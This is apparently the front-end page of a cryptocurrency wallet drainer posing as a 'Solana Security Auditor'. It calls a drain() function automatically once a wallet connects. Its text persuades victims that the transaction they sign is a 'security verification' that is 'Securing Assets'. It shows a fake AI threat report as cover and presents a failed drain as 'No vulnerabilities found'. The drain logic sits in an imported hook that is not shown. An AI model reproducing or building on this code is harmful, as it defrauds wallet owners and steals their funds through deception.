"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  Loader2,
  RefreshCw,
  LayoutDashboard,
  ShieldAlert,
  Unplug,
  Fingerprint,
  Globe
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
    { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing security protocols...', icon: Server },
  { text: 'Compiling on-chain transaction data...', icon: FileScan },
  { text: 'Auditing smart contract interactions...', icon: SearchCode },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion },
  { text: 'Cross-referencing known threat databases...', icon: Network },
  { text: 'Finalizing comprehensive threat report...', icon: ShieldCheck },
];

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Awaiting Signature...", subtitle: "Please approve the security verification in your wallet.", icon: Fingerprint };
      case 'sending':
        return { title: "Securing Assets...", subtitle: "Finalizing cryptographic proof on the Solana network.", icon: Globe };
      case 'building':
        return { title: "Optimizing Protocol...", subtitle: "Preparing advanced security routing instructions.", icon: SearchCode };
      default:
        return { title: "Security Audit in Progress...", subtitle: scanningSteps[currentStep].text, icon: null };
    }
  };

  const { title, subtitle, icon: StatusIcon } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-8">
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-12 flex h-48 w-48 items-center justify-center"
        style={{ perspective: '1000px' }}
      >
        <div className="absolute inset-0 rounded-full bg-primary/10 animate-pulse"></div>
        <div className="absolute inset-4 rounded-full bg-primary/20 animate-pulse [animation-delay:200ms]"></div>
        
        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60 }}
          transition={{ duration: 0.8, ease: 'easeInOut' }}
        >
          {status === 'signing' || status === 'sending' ? (
             <div className="absolute flex h-full w-full items-center justify-center">
                <div className="flex h-32 w-32 items-center justify-center rounded-3xl bg-primary/20 border-2 border-primary/50 backdrop-blur-xl shadow-[0_0_50px_rgba(153,69,255,0.3)]">
                  {StatusIcon && <StatusIcon className="h-16 w-16 text-primary animate-pulse" />}
                </div>
             </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(120px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className="flex h-20 w-20 items-center justify-center rounded-2xl bg-card/80 border border-white/10 backdrop-blur-sm shadow-xl">
                    <step.icon className="h-10 w-10 text-primary" />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>
      </motion.div>

      <h2 className="text-3xl font-bold font-headline text-foreground mb-3 tracking-tight">
        {title}
      </h2>
      <div className="text-muted-foreground h-12 max-w-sm">
        <AnimatePresence mode="wait">
          <motion.span
            key={subtitle}
            initial={{ opacity: 0, y: 5 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -5 }}
            className="block text-center text-lg italic leading-tight"
          >
            {subtitle}
          </motion.span>
        </AnimatePresence>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);

  useEffect(() => {
    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
    if (connected && !hasProcessStarted.has(status) && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  useEffect(() => {
    // Crucially wait for terminal state before starting AI analysis
    if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, error, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Failed to load AI report", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 md:p-8">
      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-lg p-10 bg-card/40 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/10 text-center"
          >
            <div className="relative mx-auto flex h-20 w-20 items-center justify-center mb-6">
              <div className="absolute inset-0 bg-primary/20 blur-xl rounded-full animate-pulse"></div>
              <ShieldCheck className="relative h-12 w-12 text-primary" />
            </div>
            <h1 className="text-3xl font-bold font-headline mb-4">Solana Security Auditor</h1>
            <p className="text-muted-foreground mb-8 text-lg">
              Connect your wallet to begin a comprehensive, AI-powered on-chain security scan and risk assessment.
            </p>
            <WalletMultiButtonDynamic 
              style={{ 
                width: '100%', 
                background: 'linear-gradient(to right, #9945FF, #14F195)', 
                color: 'white', 
                fontSize: '1.25rem', 
                padding: '1.75rem 1rem', 
                borderRadius: '1rem',
                border: 'none',
                boxShadow: '0 10px 25px -5px rgba(153, 69, 255, 0.4)'
              }} 
            />
          </motion.div>
        ) : isAuditInProgress || (isAiLoading && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="w-full max-w-2xl p-12 bg-card/60 backdrop-blur-2xl rounded-3xl shadow-3xl border border-white/5 text-center"
          >
            <ScanningAnimation status={status} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-5xl space-y-8"
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-6 bg-card/40 p-6 rounded-3xl border border-white/10 backdrop-blur-md">
              <div className="flex items-center gap-4">
                <div className="h-12 w-12 rounded-full bg-accent/20 flex items-center justify-center">
                  <ShieldCheck className="h-6 w-6 text-accent" />
                </div>
                <div>
                  <h2 className="text-xl font-bold font-headline">Audit Result: {status === 'success' ? "Assets Secured" : "Wallet Analysis Complete"}</h2>
                  <p className="text-sm text-muted-foreground font-mono truncate max-w-[200px] md:max-w-xs">{publicKey?.toBase58()}</p>
                </div>
              </div>
              <div className="flex gap-4">
                <Button variant="outline" onClick={() => { setShowReport(false); drain(); }} className="rounded-xl border-white/10 hover:bg-white/5">
                  <RefreshCw className="mr-2 h-4 w-4" />
                  Rescan
                </Button>
                <Button variant="destructive" onClick={() => disconnect()} className="rounded-xl shadow-lg">
                  Disconnect
                </Button>
              </div>
            </div>

            <Overview threatsResult={threats} connectionsResult={connections} />

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-1 bg-muted/20 rounded-2xl mb-6">
                <TabsTrigger value="threats" className="rounded-xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground">
                  <ShieldAlert className="mr-2 h-4 w-4" />
                  Threat Analysis
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground">
                  <Unplug className="mr-2 h-4 w-4" />
                  Active Connections
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections">
                <Connections result={connections} isLoading={false} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : (
          <motion.div
            key="error-state"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="w-full max-w-lg p-10 bg-card/40 backdrop-blur-xl rounded-3xl shadow-2xl border border-destructive/20 text-center"
          >
            <div className="h-16 w-16 bg-destructive/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <ShieldAlert className="h-8 w-8 text-destructive" />
            </div>
            <h2 className="text-2xl font-bold mb-4">Scan Interrupted</h2>
            <p className="text-muted-foreground mb-8">
              {error === "Data Packet Network Congestion." ? "No vulnerabilities found on this wallet address." : error}
            </p>
            <div className="flex flex-col gap-4">
               <Button onClick={() => drain()} className="w-full rounded-xl py-6 text-lg font-bold">
                 Try Scan Again
               </Button>
               <Button variant="ghost" onClick={() => disconnect()} className="w-full">
                 Switch Wallet
               </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      <p className="text-xs text-muted-foreground mt-8">Solana Shield Protocol v1.2.4 • End-to-End Encrypted Audit</p>
    </main>
  );
}